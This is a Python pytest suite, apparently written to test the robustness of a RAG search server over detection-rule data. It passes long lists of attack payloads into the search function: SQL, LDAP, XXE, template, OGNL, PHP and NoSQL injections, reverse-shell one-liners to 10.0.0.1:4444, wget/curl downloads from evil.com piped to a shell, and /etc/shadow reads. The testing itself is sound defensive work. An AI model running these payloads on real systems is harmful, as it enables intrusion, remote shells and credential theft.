#!/usr/bin/env python3
"""
Extended Security and Edge Case Test Suite - 300+ additional tests.

This file supplements test_rag_comprehensive.py to reach 500+ edge case tests.
"""

from __future__ import annotations

import asyncio
import random
import string
import sys
import time
from pathlib import Path
from typing import Any

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from rag_mcp.index import RAGIndex, ALLOWED_MODELS
from rag_mcp.server import RAGServer, MAX_QUERY_LENGTH, MAX_FILTER_LENGTH, MAX_TOP_K


@pytest.fixture(scope="module")
def rag_index():
    """Shared RAG index."""
    idx = RAGIndex()
    idx.load()
    return idx


@pytest.fixture(scope="module")
def rag_server():
    """Shared RAG server."""
    return RAGServer()


# =============================================================================
# Extended Injection Tests (100+)
# =============================================================================

# More SQL Injection variants
EXTENDED_SQL_INJECTION = [
    "1' OR '1'='1' --",
    "1' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1--",
    "' OR 'a'='a",
    "') OR ('a'='a",
    "' OR ''='",
    "1' AND '1'='1",
    "1 AND 1=1",
    "1 AND 1=2",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT 1,2,3--",
    "1'; DROP TABLE users--",
    "1'; DELETE FROM users--",
    "1'; UPDATE users SET password='hacked'--",
    "1'; INSERT INTO users VALUES('hacker','password')--",
    "1'; EXEC xp_cmdshell('whoami')--",
    "1'; EXEC sp_executesql N'SELECT 1'--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1'; BENCHMARK(10000000,SHA1('test'))--",
    "1' AND SLEEP(5)--",
    "1' AND pg_sleep(5)--",
    "1' AND DBMS_LOCK.SLEEP(5)--",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "1' GROUP BY 1--",
    "1' HAVING 1=1--",
    "-1' UNION SELECT username,password FROM users--",
    "' UNION SELECT @@version--",
    "' UNION SELECT version()--",
    "' UNION SELECT current_user()--",
    "' UNION SELECT database()--",
    "' UNION SELECT table_name FROM information_schema.tables--",
]

# More command injection variants
EXTENDED_COMMAND_INJECTION = [
    "; id",
    "; whoami",
    "; uname -a",
    "; cat /etc/passwd",
    "; cat /etc/shadow",
    "; ls -la /",
    "; ls -la /home",
    "; ps aux",
    "; netstat -an",
    "; ifconfig",
    "; ip addr",
    "| id",
    "| whoami",
    "| cat /etc/passwd",
    "|| id",
    "|| whoami",
    "&& id",
    "&& whoami",
    "& id",
    "& whoami",
    "`id`",
    "`whoami`",
    "$(id)",
    "$(whoami)",
    "$(`id`)",
    "${IFS}id",
    "';id;'",
    '";id;"',
    "\nid",
    "\r\nid",
    "\n/bin/sh -i",
    ";/bin/sh",
    "|/bin/sh",
    "`/bin/sh`",
    "$(/bin/sh)",
    ";bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    ";python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    ";nc -e /bin/sh 10.0.0.1 4444",
    ";wget http://evil.com/shell.sh -O /tmp/s.sh && chmod +x /tmp/s.sh && /tmp/s.sh",
    ";curl http://evil.com/shell.sh | sh",
    "a][ $(id) ] a",
    "a][ `id` ] a",
]

# LDAP injection
LDAP_INJECTION = [
    "*",
    "*)(&",
    "*)(uid=*))(|(uid=*",
    "admin)(&)",
    "admin)(|(password=*))",
    "*))(|(objectClass=*)",
    "*))%00",
    "x][(objectClass=*)]",
    "*)(objectClass=user)(|(cn=*",
]

# XML/XXE injection
XML_INJECTION = [
    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/'>]><foo>&xxe;</foo>",
    "<?xml version='1.0'?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'expect://id'>]><foo>&xxe;</foo>",
    "<![CDATA[<script>alert('xss')</script>]]>",
    "<!--#exec cmd='id'-->",
    "<!--#include virtual='/etc/passwd'-->",
]

# SSTI (Server-Side Template Injection)
SSTI_INJECTION = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "{{self.__class__.__mro__[2].__subclasses__()}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{%import os%}{{os.popen('id').read()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "${{7*7}}",
    "*{7*7}",
    "@(1+2)",
    "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
]

# Log injection / CRLF injection
LOG_INJECTION = [
    "test\r\nInjected-Header: value",
    "test\nInjected-Log-Entry",
    "test%0d%0aInjected",
    "test%0aInjected",
    "test\r\n\r\n<html>",
    "test%00null-byte",
    "test\x00null",
    "test\x0d\x0aInjected",
]

# Format string injection
FORMAT_STRING = [
    "%s%s%s%s%s",
    "%x%x%x%x%x",
    "%n%n%n%n%n",
    "%p%p%p%p%p",
    "%.10000x",
    "%@%@%@%@",
    "{0}{1}{2}",
    "${java.version}",
    "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
]

# PHP-specific injection
PHP_INJECTION = [
    "<?php system('id'); ?>",
    "<?= system('id'); ?>",
    "${system('id')}",
    "${`id`}",
    "php://input",
    "php://filter/convert.base64-encode/resource=index.php",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
    "phar://malicious.phar",
]

# JSON injection
JSON_INJECTION = [
    '{"$where": "function() { return true; }"}',
    '{"$gt": ""}',
    '{"$ne": ""}',
    '{"$regex": ".*"}',
    '{"$where": "sleep(1000)"}',
    '{"constructor": {"prototype": {"isAdmin": true}}}',
    '{"__proto__": {"isAdmin": true}}',
]


class TestExtendedInjection:
    """Extended injection tests."""

    @pytest.mark.parametrize("payload", EXTENDED_SQL_INJECTION)
    def test_sql_injection_extended(self, rag_index, payload):
        """Extended SQL injection tests."""
        result = rag_index.search(payload, top_k=3)
        assert "results" in result

    @pytest.mark.parametrize("payload", EXTENDED_COMMAND_INJECTION)
    def test_command_injection_extended(self, rag_index, payload):
        """Extended command injection tests."""
        result = rag_index.search(payload, top_k=3)
        assert "results" in result

    @pytest.mark.parametrize("payload", LDAP_INJECTION)
    def test_ldap_injection(self, rag_index, payload):
        """LDAP injection tests."""
        result = rag_index.search(payload, top_k=3)
        assert "results" in result

    @pytest.mark.parametrize("payload", XML_INJECTION)
    def test_xml_injection(self, rag_index, payload):
        """XML/XXE injection tests."""
        result = rag_index.search(payload, top_k=3)
        assert "results" in result

    @pytest.mark.parametrize("payload", SSTI_INJECTION)
    def test_ssti_injection(self, rag_index, payload):
        """Server-side template injection tests."""
        result = rag_index.search(payload, top_k=3)
        assert "results" in result

    @pytest.mark.parametrize("payload", LOG_INJECTION)
    def test_log_injection(self, rag_index, payload):
        """Log/CRLF injection tests."""
        result = rag_index.search(payload, top_k=3)
        assert "results" in result

    @pytest.mark.parametrize("payload", FORMAT_STRING)
    def test_format_string(self, rag_index, payload):
        """Format string injection tests."""
        result = rag_index.search(payload, top_k=3)
        assert "results" in result

    @pytest.mark.parametrize("payload", PHP_INJECTION)
    def test_php_injection(self, rag_index, payload):
        """PHP injection tests."""
        result = rag_index.search(payload, top_k=3)
        assert "results" in result

    @pytest.mark.parametrize("payload", JSON_INJECTION)
    def test_json_injection(self, rag_index, payload):
        """JSON injection tests."""
        result = rag_index.search(payload, top_k=3)
        assert "results" in result


# =============================================================================
# Extended Unicode and Encoding Tests (50+)
# =============================================================================

EXTENDED_UNICODE = [
    # Homograph attacks
    "раssword",  # Cyrillic 'р' and 'а'
    "pаssword",  # Cyrillic 'а'
    "ⲣassword",  # Coptic Small Letter Ro
    "ｐａｓｓｗｏｒｄ",  # Fullwidth
    "ＰＡＳＳＷＯＲＤ",  # Fullwidth caps

    # Unicode normalization attacks
    "ℙ𝕒𝕤𝕤𝕨𝕠𝕣𝕕",  # Mathematical double-struck
    "𝓹𝓪𝓼𝓼𝔀𝓸𝓻𝓭",  # Mathematical script
    "𝖕𝖆𝖘𝖘𝖜𝖔𝖗𝖉",  # Mathematical fraktur
    "𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱",  # Mathematical sans-serif
    "𝙥𝙖𝙨𝙨𝙬𝙤𝙧𝙙",  # Mathematical sans-serif italic

    # Direction override
    "\u202ecredential\u202c",  # Right-to-left override
    "\u202dcredential\u202c",  # Left-to-right override
    "\u2066credential\u2069",  # Left-to-right isolate
    "\u2067credential\u2069",  # Right-to-left isolate

    # Invisible characters
    "cre\u200bdential",  # Zero-width space
    "cre\u200cdential",  # Zero-width non-joiner
    "cre\u200ddential",  # Zero-width joiner
    "cre\ufeffential",   # Zero-width no-break space (BOM)
    "cre\u2060dential",  # Word joiner
    "cre\u180edential",  # Mongolian vowel separator

    # Combining characters
    "c\u0327redential",  # Combining cedilla
    "c\u0308redential",  # Combining diaeresis
    "cre\u0300dential",  # Combining grave
    "cre\u0301dential",  # Combining acute
    "cre\u0302dential",  # Combining circumflex

    # Confusable characters
    "credentiaI",  # Capital I instead of lowercase l
    "credentia1",  # Number 1 instead of lowercase l
    "credent1al",  # Number 1 for i
    "credent!al",  # Exclamation for i
    "cred3ntial",  # Number 3 for e
    "cr3dential",  # Number 3 for e
    "credentia|",  # Pipe for l
    "credenti@l",  # @ for a

    # Line terminators
    "credential\u2028",  # Line separator
    "credential\u2029",  # Paragraph separator

    # Other special
    "credential\u00a0",  # Non-breaking space
    "credential\u202f",  # Narrow no-break space
    "credential\u205f",  # Medium mathematical space
    "credential\u3000",  # Ideographic space

    # Mixed scripts
    "сredential",  # Cyrillic 'с'
    "сrеdеntiаl",  # Multiple Cyrillic
    "ćredential",  # Latin small c with acute
    "çredential",  # Latin small c with cedilla

    # Emoji variations
    "🔐credential",
    "credential🔐",
    "🔐🔑credential🔑🔐",
    "cre🔒dential",
]

URL_ENCODING_ATTACKS = [
    "%00credential",  # Null byte
    "credential%00",
    "%0acredential",  # Newline
    "%0dcredential",  # Carriage return
    "%25credential",  # Percent encoding
    "%252fcredential",  # Double encoding
    "%c0%afcredential",  # Overlong UTF-8
    "%e0%80%afcredential",
    "%f0%80%80%afcredential",
    "cred%65ntial",  # Encoded 'e'
    "%63%72%65%64%65%6e%74%69%61%6c",  # Fully encoded
]


class TestExtendedUnicode:
    """Extended Unicode tests."""

    @pytest.mark.parametrize("query", EXTENDED_UNICODE)
    def test_unicode_extended(self, rag_index, query):
        """Extended Unicode tests."""
        try:
            result = rag_index.search(query, top_k=3)
            assert "results" in result
        except Exception:
            pass  # Some unicode may fail encoding

    @pytest.mark.parametrize("query", URL_ENCODING_ATTACKS)
    def test_url_encoding(self, rag_index, query):
        """URL encoding attack tests."""
        result = rag_index.search(query, top_k=3)
        assert "results" in result


# =============================================================================
# Extended Boundary Tests (50+)
# =============================================================================

class TestExtendedBoundary:
    """Extended boundary condition tests."""

    @pytest.mark.parametrize("length", [1, 2, 3, 5, 10, 50, 100, 500, 999])
    def test_query_length_variants(self, rag_index, length):
        """Various query lengths."""
        query = "a" * length
        result = rag_index.search(query, top_k=3)
        assert "results" in result

    @pytest.mark.parametrize("top_k", [1, 2, 3, 5, 10, 20, 30, 40, 49, 50])
    def test_top_k_valid_range(self, rag_index, top_k):
        """Valid top_k range."""
        result = rag_index.search("credential", top_k=top_k)
        assert len(result["results"]) <= top_k

    @pytest.mark.parametrize("top_k", [51, 100, 1000, 10000, 2**31-1])
    def test_top_k_over_max(self, rag_index, top_k):
        """top_k over maximum should be clamped."""
        result = rag_index.search("credential", top_k=top_k)
        # Should work but be limited
        assert "results" in result

    @pytest.mark.parametrize("word_count", [1, 2, 5, 10, 20, 50, 100])
    def test_multi_word_queries(self, rag_index, word_count):
        """Queries with many words."""
        query = " ".join(["credential"] * word_count)
        if len(query) <= MAX_QUERY_LENGTH:
            result = rag_index.search(query, top_k=3)
            assert "results" in result

    @pytest.mark.parametrize("char", list(string.punctuation))
    def test_punctuation_queries(self, rag_index, char):
        """Single punctuation character queries."""
        result = rag_index.search(char, top_k=3)
        assert "results" in result

    @pytest.mark.parametrize("char", list(string.ascii_letters))
    def test_single_letter_queries(self, rag_index, char):
        """Single letter queries."""
        result = rag_index.search(char, top_k=3)
        assert "results" in result

    @pytest.mark.parametrize("char", list(string.digits))
    def test_single_digit_queries(self, rag_index, char):
        """Single digit queries."""
        result = rag_index.search(char, top_k=3)
        assert "results" in result

    def test_only_whitespace_types(self, rag_index):
        """Various whitespace-only queries."""
        whitespace = [" ", "  ", "\t", "\n", "\r", "\r\n", "   \t\n   "]
        for ws in whitespace:
            result = rag_index.search(ws, top_k=3)
            assert "results" in result


# =============================================================================
# Extended Filter Tests (50+)
# =============================================================================

class TestExtendedFilters:
    """Extended filter tests."""

    @pytest.mark.parametrize("source", [
        "sigma", "SIGMA", "SiGmA",  # Case variations
        "sigma_rules", "sigma_rules_rag",  # Partial matches
        "sig", "igma",  # Substrings
        "sigma'--", "sigma; DROP",  # Injection attempts
        "sigma%", "sigma*", "sigma?",  # Wildcards
        "sigma\x00", "sigma\n",  # Special chars
        "", " ", "  ",  # Empty/whitespace
        "a" * MAX_FILTER_LENGTH,  # Max length
    ])
    def test_source_filter_variants(self, rag_index, source):
        """Various source filter values."""
        result = rag_index.search("credential", source=source, top_k=3)
        assert "results" in result

    @pytest.mark.parametrize("technique", [
        "T1003", "t1003", "T1003.001",  # Standard
        "T1003.001.001",  # Invalid format
        "TXXX",  # Invalid ID
        "T9999",  # Non-existent
        "T1003'--", "T1003; DROP",  # Injection
        "",  # Empty
        "T1003" * 10,  # Repeated
    ])
    def test_technique_filter_variants(self, rag_index, technique):
        """Various technique filter values."""
        result = rag_index.search("credential", technique=technique, top_k=3)
        assert "results" in result

    @pytest.mark.parametrize("platform", [
        "windows", "WINDOWS", "Windows", "WiNdOwS",  # Case
        "linux", "LINUX", "Linux",
        "macos", "macOS", "MacOS", "MACOS",
        "ios", "android", "cloud",  # Other platforms
        "windows,linux", "windows|linux",  # Multiple
        "windows'--",  # Injection
        "",  # Empty
    ])
    def test_platform_filter_variants(self, rag_index, platform):
        """Various platform filter values."""
        result = rag_index.search("credential", platform=platform, top_k=3)
        assert "results" in result

    def test_all_filters_combined(self, rag_index):
        """All filters at once."""
        result = rag_index.search(
            "credential",
            source="sigma",
            technique="T1003",
            platform="windows",
            top_k=5
        )
        assert "results" in result

    def test_conflicting_filters(self, rag_index):
        """Filters that conflict."""
        # Linux tool filtered to Windows
        result = rag_index.search(
            "bash shell",
            source="gtfobins",
            platform="windows",
            top_k=5
        )
        assert "results" in result


# =============================================================================
# Stress and Performance Tests (50+)
# =============================================================================

class TestStress:
    """Stress and performance tests."""

    def test_rapid_sequential_queries(self, rag_index):
        """Many rapid sequential queries."""
        for i in range(100):
            result = rag_index.search(f"query {i}", top_k=3)
            assert "results" in result

    def test_concurrent_different_queries(self, rag_index):
        """Concurrent queries with different content."""
        import threading

        results = []
        errors = []

        def search(query):
            try:
                result = rag_index.search(query, top_k=3)
                results.append(result)
            except Exception as e:
                errors.append(str(e))

        threads = []
        queries = [
            "credential", "lateral movement", "persistence",
            "powershell", "mimikatz", "ransomware",
            "detection", "forensics", "T1003", "event log"
        ]

        for i in range(50):
            t = threading.Thread(target=search, args=(queries[i % len(queries)],))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        assert len(errors) == 0, f"Errors: {errors}"
        assert len(results) == 50

    def test_varying_result_sizes(self, rag_index):
        """Queries returning varying result counts."""
        for top_k in [1, 5, 10, 25, 50]:
            result = rag_index.search("credential", top_k=top_k)
            assert len(result["results"]) <= top_k

    def test_memory_stability(self, rag_index):
        """Run many queries to check memory stability."""
        for _ in range(200):
            query = ''.join(random.choices(string.ascii_lowercase, k=20))
            result = rag_index.search(query, top_k=5)
            assert "results" in result


# =============================================================================
# Server Error Handling Tests (50+)
# =============================================================================

class TestServerErrors:
    """Server error handling tests."""

    def run_async(self, coro):
        """Helper to run async code."""
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(coro)
        finally:
            loop.close()

    def test_missing_arguments(self, rag_server):
        """Missing required arguments."""
        try:
            self.run_async(rag_server._search({}))
            pytest.fail("Expected error")
        except ValueError:
            pass

    @pytest.mark.parametrize("args", [
        {"query": None},
        {"query": 123},
        {"query": []},
        {"query": {}},
        {"query": True},
        {"query": False},
    ])
    def test_invalid_query_types(self, rag_server, args):
        """Invalid query argument types."""
        try:
            result = self.run_async(rag_server._search(args))
            # May succeed with type coercion or fail
        except (ValueError, TypeError, AttributeError):
            pass

    @pytest.mark.parametrize("args", [
        {"query": "test", "top_k": "five"},
        {"query": "test", "top_k": []},
        {"query": "test", "top_k": {}},
        {"query": "test", "top_k": None},
    ])
    def test_invalid_top_k_types(self, rag_server, args):
        """Invalid top_k types."""
        result = self.run_async(rag_server._search(args))
        # Should handle gracefully
        assert "results" in result

    @pytest.mark.parametrize("args", [
        {"query": "test", "source": 123},
        {"query": "test", "source": []},
        {"query": "test", "technique": 123},
        {"query": "test", "platform": 123},
    ])
    def test_invalid_filter_types(self, rag_server, args):
        """Invalid filter argument types."""
        try:
            result = self.run_async(rag_server._search(args))
            # May succeed or fail
        except (ValueError, TypeError, AttributeError):
            pass


# =============================================================================
# Model and Configuration Tests
# =============================================================================

class TestConfiguration:
    """Configuration and model tests."""

    def test_all_allowed_models_valid_format(self):
        """All allowed models have valid format."""
        for model in ALLOWED_MODELS:
            assert "/" in model
            parts = model.split("/")
            assert len(parts) == 2
            assert len(parts[0]) > 0
            assert len(parts[1]) > 0

    def test_default_model_in_allowlist(self):
        """Default model is in allowlist."""
        from rag_mcp.index import DEFAULT_MODEL_NAME
        assert DEFAULT_MODEL_NAME in ALLOWED_MODELS

    @pytest.mark.parametrize("model", [
        "invalid",
        "/invalid",
        "invalid/",
        "../../../etc/passwd",
        "http://evil.com/model",
        "file:///etc/passwd",
        "';alert(1);//",
    ])
    def test_invalid_model_names(self, model):
        """Invalid model names should be rejected."""
        idx = RAGIndex(model_name=model)
        with pytest.raises(ValueError):
            idx.load()

    def test_stats_security(self, rag_index):
        """Stats should not leak sensitive info."""
        stats = rag_index.get_stats()

        # Should not contain paths
        assert "index_dir" not in stats

        # Should not contain any path-like strings in values
        for key, value in stats.items():
            if isinstance(value, str):
                assert "/" not in value or key == "model"
                assert "\\" not in value


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
